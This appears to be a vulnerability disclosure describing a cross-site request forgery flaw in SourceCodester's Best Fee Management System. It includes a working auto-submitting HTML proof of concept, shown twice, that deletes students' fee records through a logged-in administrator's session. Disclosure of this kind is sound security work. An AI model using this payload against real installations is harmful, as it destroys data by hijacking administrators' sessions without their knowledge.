# Summary
SourceCodester Best Fee Management System Project has a CSRF vulnerability in `/click_fees/index.php?page=fees`, which allows attackers to trick administrators who are logged into the site to delete students' fee information.

# Details
In url : `/click_fees/index.php?page=fees`
![image](https://github.com/user-attachments/assets/66e7dfb2-b52a-4cfc-88e8-c5e1f30b2fed)

Choose module `Students Fees` and choose option `delete`:
![image](https://github.com/user-attachments/assets/3002784c-500a-4521-b4d8-5b1a26594135)


Use burpsuite to intercept, finding that there's no csrf token for protection:
![image](https://github.com/user-attachments/assets/6dc958b6-4d9f-4e7a-9f38-cafa95a6cc5c)

CSRF PoC:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://fee:84/click_fees/ajax.php?action=delete_fees" method="POST">
      <input type="hidden" name="id" value="3" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![CSRF2_PoC](https://github.com/user-attachments/assets/7da0d4d6-c958-479e-b251-bee24f2f90cc)



# PoC
CSRF PoC:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://fee:84/click_fees/ajax.php?action=delete_fees" method="POST">
      <input type="hidden" name="id" value="3" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![CSRF2_PoC](https://github.com/user-attachments/assets/7da0d4d6-c958-479e-b251-bee24f2f90cc)
